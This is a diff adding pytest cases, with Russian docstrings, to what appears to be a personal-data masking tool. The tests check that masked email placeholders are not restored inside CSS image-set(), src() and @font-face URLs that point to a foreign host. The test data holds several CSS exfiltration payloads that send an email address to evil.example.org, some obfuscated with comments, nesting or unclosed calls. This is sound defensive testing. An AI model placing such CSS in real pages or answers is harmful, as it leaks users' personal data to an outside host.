@@ -284,6 +284,57 @@ def test_nothing_is_restored_inside_a_foreign_css_url(settings, answer):
 
 
 @pytest.mark.parametrize(
+    "answer",
+    [
+        '<style>a{background-image:image-set("https://evil.example.org/?q= <EMAIL_1>" 1x)}</style>',
+        "<style>a{background-image:-webkit-image-set('https://evil.example.org/?q= <EMAIL_1>' 1x)}</style>",
+        '@font-face { src: src("https://evil.example.org/f?q= <EMAIL_1>") }',
+        'a { background: image-set("a.png" 1x, "https://evil.example.org/?q= <EMAIL_1>" 2x) }',
+        'a { background: IMAGE-SET(\n  "a.png" 1x,\n  "https://evil.example.org/?q= <EMAIL_1>" 2x\n) }',
+        'a { background: image-set(linear-gradient(rgb(0 0 0/50%), red) 1x,'
+        ' "https://evil.example.org/?q= <EMAIL_1>" 2x) }',
+        'a { background: image-set("a).png" 1x, /* ) */ "https://evil.example.org/?q= <EMAIL_1>" 2x) }',
+        'a { background: image-set(var(--a, {;}) 1x, "https://evil.example.org/?q= <EMAIL_1>" 2x) }',
+        'a { background: image-set(' + "f(" * 6 + ")" * 6 + ' 1x, "https://evil.example.org/?q= <EMAIL_1>" 2x) }',
+        '<style>a{background:image-set("a.png" 1x, "https://evil.example.org/?q= <EMAIL_1>"',
+    ],
+)
+def test_nothing_is_restored_inside_a_foreign_css_image_set(settings, answer):
+    """Хэнд-офф, P2: строку в image-set() — в любом варианте, не только в первом, — и в src() браузер загружает
+    сам, как url(). Вызов берётся целиком по скобкам: градиент, var() с блоком, «)» в строке и в комментарии его
+    не кончают; вложенность глубже разбираемой и незакрытый вызов тянутся до конца ответа."""
+    result = restore(link_state(), answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+
+
+@pytest.mark.parametrize(
+    "answer, restored",
+    [
+        (
+            'b { background: image-set("img/<EMAIL_1>.png" 1x) }',
+            'b { background: image-set("img/ivanov@contoso.ru.png" 1x) }',
+        ),
+        (
+            'b { background: image-set("https://host-1.domain-1.example/a b.png" 1x, "c.png" 2x) }',
+            'b { background: image-set("https://srv-dc01.contoso.ru/a b.png" 1x, "c.png" 2x) }',
+        ),
+        (
+            'b { background: image-set("https://evil.example.org/a.png" 1x) } /* автор <EMAIL_1> */',
+            'b { background: image-set("https://evil.example.org/a.png" 1x) } /* автор ivanov@contoso.ru */',
+        ),
+        (
+            "Функция image-set() выбирает картинку (см. https://wiki.example.org/css), автор <EMAIL_1>",
+            "Функция image-set() выбирает картинку (см. https://wiki.example.org/css), автор ivanov@contoso.ru",
+        ),
+    ],
+)
+def test_own_and_nearby_css_image_sets_are_restored(settings, answer, restored):
+    """Та же находка с другой стороны: наш и относительный адрес в image-set() восстанавливаются, метка после
+    закрытого вызова — тоже, и в тексте, где image-set() только упомянут."""
+    assert restore(link_state(), answer, settings).text == restored
+
+
+@pytest.mark.parametrize(
     "answer, restored",
     [
         (
